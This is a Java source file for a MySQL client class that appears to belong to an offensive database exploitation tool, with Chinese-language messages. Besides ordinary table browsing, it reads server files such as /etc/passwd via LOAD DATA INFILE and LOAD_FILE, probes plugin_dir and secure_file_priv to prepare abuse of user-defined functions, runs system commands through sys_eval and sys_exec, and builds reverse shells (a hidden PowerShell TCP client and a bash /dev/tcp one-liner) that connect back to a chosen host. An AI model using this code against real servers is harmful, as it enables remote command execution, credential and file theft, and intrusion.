package database;

import java.sql.*;
import java.util.ArrayList;
import java.util.List;

public class mysql {

    private String host;
    private String port;
    private String database;
    private String username;
    private String password;

    private Connection conn = null;

    public mysql(String host, String port, String database, String username, String password) {
        this.host = host;
        this.port = port;
        this.database = database;
        this.username = username;
        this.password = password;
    }

    public static String readFiles(String path, String type) {
        if (path.isEmpty()) {
            path = "/etc/passwd";
        }

        path = path.replace("'", "''");

        return switch (type) {
            case "LOAD_DATA" -> String.format("""
                    CREATE DATABASE IF NOT EXISTS udf_load_dada_7788941 CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
                    USE udf_load_dada_7788941;
                    DROP TABLE IF EXISTS udf_load_dada_test_import_7788941;
                    CREATE TABLE udf_load_dada_test_import_7788941 (name VARCHAR(255));
                    LOAD DATA INFILE '%s' INTO TABLE udf_load_dada_test_import_7788941 FIELDS TERMINATED BY ',' LINES TERMINATED BY '\\n';
                    SELECT * FROM udf_load_dada_test_import_7788941;
                    """, path);
            case "LOAD_FILE" ->
                    String.format("SELECT CONVERT(LOAD_FILE('%s') USING utf8) AS udf_load_file_test_import_7788941;", path);
            default -> String.format("""
                    DROP TABLE IF EXISTS udf_load_dada_test_import_7788941;
                    CREATE TABLE udf_load_dada_test_import_7788941 (name VARCHAR(255));
                    LOAD DATA INFILE '%s' INTO TABLE udf_load_dada_test_import_7788941 FIELDS TERMINATED BY ',' LINES TERMINATED BY '\\n';
                    SELECT * FROM udf_load_dada_test_import_7788941;
                    """, path);
        };

    }

    private Connection getConnection() throws SQLException {
        if (conn == null || conn.isClosed()) {
            String url = "jdbc:mysql://" + host + ":" + port + "/" + database + "?useSSL=false&allowMultiQueries=true";
            conn = DriverManager.getConnection(url, username, password);
        }
        return conn;
    }

    public void close() {
        if (conn != null) {
            try {
                if (!conn.isClosed()) conn.close();
            } catch (SQLException e) {
                System.err.println("\uD83D\uDCA5 [mysql.close] Close connection error: " + e.getMessage());
            } finally {
                conn = null;
            }
        }
    }

    public boolean testConnection() {
        String url = String.format("jdbc:mysql://%s:%s/%s?useSSL=false", this.host, this.port, this.database);
        try (Connection tmp = DriverManager.getConnection(url, this.username, this.password)) {
            return tmp != null && !tmp.isClosed();
        } catch (SQLException e) {
            e.printStackTrace();
            return false;
        }
    }

    public List<String> getDatabases() {
        List<String> dbList = new ArrayList<>();
        String url = String.format("jdbc:mysql://%s:%s/%s?useSSL=false", this.host, this.port, this.database);
        try (Connection con = DriverManager.getConnection(url, this.username, this.password);
             Statement stmt = con.createStatement();
             ResultSet rs = stmt.executeQuery("SHOW DATABASES")) {
            while (rs.next()) {
                dbList.add(rs.getString(1));
            }
        } catch (SQLException e) {
            System.out.println("[!] \uD83D\uDCA5获取数据库列表失败: " + e.getMessage());
        }
        return dbList;
    }

    public List<String> getSchemas() {
        List<String> schemas = new ArrayList<>();
        schemas.add("default");
        return schemas;
    }

    public List<String> getTables(String schema) {
        List<String> tables = new ArrayList<>();
        String sql = "SELECT table_name FROM information_schema.tables WHERE table_schema = ? ORDER BY table_name";
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement(sql)) {
                ps.setString(1, database);
                try (ResultSet rs = ps.executeQuery()) {
                    while (rs.next()) {
                        tables.add(rs.getString("table_name"));
                    }
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return tables;
    }

    public List<String> getColumnNames(String schema, String table) {
        List<String> columns = new ArrayList<>();
        String sql = "SELECT column_name FROM information_schema.columns WHERE table_schema = ? AND table_name = ? ORDER BY ordinal_position";
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement(sql)) {
                ps.setString(1, database);
                ps.setString(2, table);
                try (ResultSet rs = ps.executeQuery()) {
                    while (rs.next()) {
                        columns.add(rs.getString("column_name"));
                    }
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return columns;
    }

    public List<List<Object>> getTopRows(String schema, String table, int limit) {
        List<List<Object>> rows = new ArrayList<>();
        String sql = "SELECT * FROM " + table + " LIMIT " + limit;
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement(sql);
                 ResultSet rs = ps.executeQuery()) {
                ResultSetMetaData meta = rs.getMetaData();
                int colCount = meta.getColumnCount();
                while (rs.next()) {
                    List<Object> row = new ArrayList<>();
                    for (int i = 1; i <= colCount; i++) {
                        row.add(rs.getObject(i));
                    }
                    rows.add(row);
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return rows;
    }

    public String executeSQL(String sql) throws SQLException {
        if (sql == null || sql.trim().isEmpty()) {
            return "[!] SQL语句不能为空！";
        }

        StringBuilder sb = new StringBuilder();
        String[] statements = sql.split(";");

        Connection c = getConnection();
        for (String stmtStr : statements) {
            stmtStr = stmtStr.trim();
            if (stmtStr.isEmpty()) continue;

            try (Statement stmt = c.createStatement()) {
                boolean hasResultSet = stmt.execute(stmtStr);

                if (hasResultSet) {
                    try (ResultSet rs = stmt.getResultSet()) {
                        ResultSetMetaData meta = rs.getMetaData();
                        int colCount = meta.getColumnCount();
                        while (rs.next()) {
                            for (int i = 1; i <= colCount; i++) {
                                String val = rs.getString(i); // 使用 getString
                                if (i > 1) sb.append("\t");
                                sb.append(val != null ? val : "NULL");
                            }
                            sb.append("\n");
                        }
                    }
                }
            } catch (Exception e) {
                if (sb.length() > 0) sb.append("\n");
                sb.append("[-] ").append(e.getMessage());
            }
        }

        return sb + "\n";
    }

    public String getDatabaseInfo() {
        StringBuilder sb = new StringBuilder();
        try {
            Connection c = getConnection();
            try (Statement stmt = c.createStatement()) {
                try (ResultSet rs = stmt.executeQuery("SELECT VERSION()")) {
                    if (rs.next()) sb.append("[+] Database Version: ").append(rs.getString(1)).append("\n");
                }
                try (ResultSet rs = stmt.executeQuery("SELECT CURRENT_USER()")) {
                    if (rs.next()) sb.append("[+] Current User: ").append(rs.getString(1).split("@")[0]).append("\n");
                }
                try (ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'datadir'")) {
                    if (rs.next()) sb.append("[+] Data directory: ").append(rs.getString(2)).append("\n");
                }
                try (ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'plugin_dir'")) {
                    if (rs.next()) sb.append("[+] Plugin dir: ").append(rs.getString(2)).append("\n");
                }
                try (ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'secure_file_priv'")) {
                    if (rs.next()) sb.append("[+] secure_file_priv: ").append(rs.getString(2)).append("\n");
                }
            }
        } catch (SQLException e) {
            sb.append("[!] \uD83D\uDCA5获取数据库信息失败: ").append(e.getMessage()).append("\n");
        }
        return sb.toString();
    }

    public List<String> udf_init() {
        List<String> info = new ArrayList<>();
        try {
            Connection c = getConnection();
            try (Statement stmt = c.createStatement()) {
                try (ResultSet rs = stmt.executeQuery("SELECT @@version_compile_os")) {
                    String os = rs.next() ? rs.getString(1).toLowerCase() : "other";
                    if (os.contains("win")) os = "windows";
                    else if (os.contains("linux")) os = "linux";
                    else if (os.contains("mac") || os.contains("darwin")) os = "mac";
                    else os = "other";
                    info.add(os);
                }
                try (ResultSet rs = stmt.executeQuery("SELECT @@version_compile_machine")) {
                    String machine = rs.next() ? rs.getString(1).toLowerCase() : "x86_64";
                    String bits = machine.contains("64") ? "64" : "32";
                    info.add(bits);
                }
                try (ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'plugin_dir'")) {
                    String pluginDir = rs.next() ? rs.getString(2) : "/tmp/";
                    info.add(pluginDir);
                }
                try (ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'sql_mode'")) {
                    String sqlMode = rs.next() ? rs.getString(2) : "";
                    info.add(sqlMode);
                }
            }
        } catch (SQLException e) {
            System.out.println(e.getMessage());
        }
        return info;
    }

    public boolean reverseShell(String host, int port) throws SQLException {
        if (host == null || host.trim().isEmpty()) {
            throw new IllegalArgumentException("Host cannot be null or empty");
        }

        if (port < 1 || port > 65535) {
            throw new IllegalArgumentException("Port must be between 1 and 65535");
        }

        String os = getOperatingSystem();
        String command = buildReverseShellCommand(host, port, os);

        if (command == null) {
            System.err.println("Unsupported operating system: " + os);
            return false;
        }

        return executeSystemCommand(command);
    }

    private String getOperatingSystem() {
        try {
            List<String> udfInfo = udf_init();
            return udfInfo != null && !udfInfo.isEmpty() ? udfInfo.get(0) : "unknown";
        } catch (Exception e) {
            System.err.println("\uD83D\uDCA5Error getting OS info: " + e.getMessage());
            return "unknown";
        }
    }

    private String buildReverseShellCommand(String host, int port, String os) {
        switch (os.toLowerCase()) {
            case "windows":
                return buildWindowsReverseShellCommand(host, port);
            case "linux":
                return buildLinuxReverseShellCommand(host, port);
            default:
                return null;
        }
    }

    private String buildWindowsReverseShellCommand(String host, int port) {
        return "powershell -WindowStyle Hidden -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
    }

    private String buildLinuxReverseShellCommand(String host, int port) {
        return String.format("/bin/bash -c \"/bin/bash -i >& /dev/tcp/%s/%d 0>&1\"", host, port);
    }

    private boolean executeSystemCommand(String command) {
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement("SELECT sys_exec(?);")) {
                ps.setString(1, command);
                ps.execute();
                return true;
            }
        } catch (SQLException e) {
            System.out.println(e.getMessage());
            return false;
        }
    }


    public static String exCmd(String type, String cmd) {

        if (cmd == null || cmd.isEmpty()) {
            cmd = "whoami";
        }

        String safeCmd = cmd.replace("'", "''");

        String sqlUdf = "SELECT sys_eval('%s');";
        return String.format(sqlUdf, safeCmd);
    }

    /**
     * 直接执行系统命令：优先使用 sys_eval，若 1305 报不存在则回退到 sys_exec
     * 返回标准化文本输出，便于面板展示
     */
    public String executeCommandWithUdfFallback(String cmd) {
        if (cmd == null || cmd.trim().isEmpty()) cmd = "whoami";
        StringBuilder out = new StringBuilder();
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement("SELECT sys_eval(?);")) {
                ps.setString(1, cmd);
                boolean has = ps.execute();
                if (has) {
                    try (ResultSet rs = ps.getResultSet()) {
                        while (rs.next()) {
                            String s = rs.getString(1);
                            if (s != null) out.append(s).append("\n");
                        }
                    }
                }
                return out.toString();
            } catch (SQLException e) {
                String msg = e.getMessage() != null ? e.getMessage() : "";
                if (msg.toLowerCase().contains("does not exist") && msg.toLowerCase().contains("sys_eval")
                        || msg.toLowerCase().contains("can't find") && msg.toLowerCase().contains("sys_eval")) {
                    try (PreparedStatement ps2 = c.prepareStatement("SELECT sys_exec(?);")) {
                        String os = getOperatingSystem();
                        String execCmd = cmd;
                        if ("windows".equalsIgnoreCase(os) && !cmd.toLowerCase().startsWith("cmd ")) {
                            execCmd = "cmd /c " + cmd;
                        }
                        ps2.setString(1, execCmd);
                        boolean has2 = ps2.execute();
                        if (has2) {
                            try (ResultSet rs2 = ps2.getResultSet()) {
                                while (rs2.next()) {
                                    String s = rs2.getString(1);
                                    if (s != null) out.append(s).append("\n");
                                }
                            }
                        }
                        return "[!] sys_eval 不可用，已回退 sys_exec（仅返回退出码）\n" + out;
                    } catch (SQLException e2) {
                        return "[-] sys_eval/sys_exec 执行失败: " + e2.getMessage();
                    }
                }
                return "[-] " + msg;
            }
        } catch (SQLException e) {
            return "[-] 执行失败: " + e.getMessage();
        }
    }
}
